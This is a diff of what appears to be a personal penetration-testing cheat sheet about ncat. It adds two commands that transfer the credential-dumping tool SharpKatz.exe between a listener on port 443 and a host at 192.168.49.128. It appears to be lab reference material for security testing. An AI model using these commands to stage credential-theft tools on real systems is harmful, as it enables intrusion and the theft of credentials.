@@ -10,10 +10,17 @@ Main things I use this tool for
 
 ### Category 1
 
-SEnding a file
+Sending a file
+```bash
+sudo ncat -l -p 443 --send-only < SharpKatz.exe
 ```
+^send-file-to-listener
+
+Receiving a file
+```bash
+ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
 ```
-^ncat-category3
+^receive-file-from-listener
 
 ## Personal Notes
 
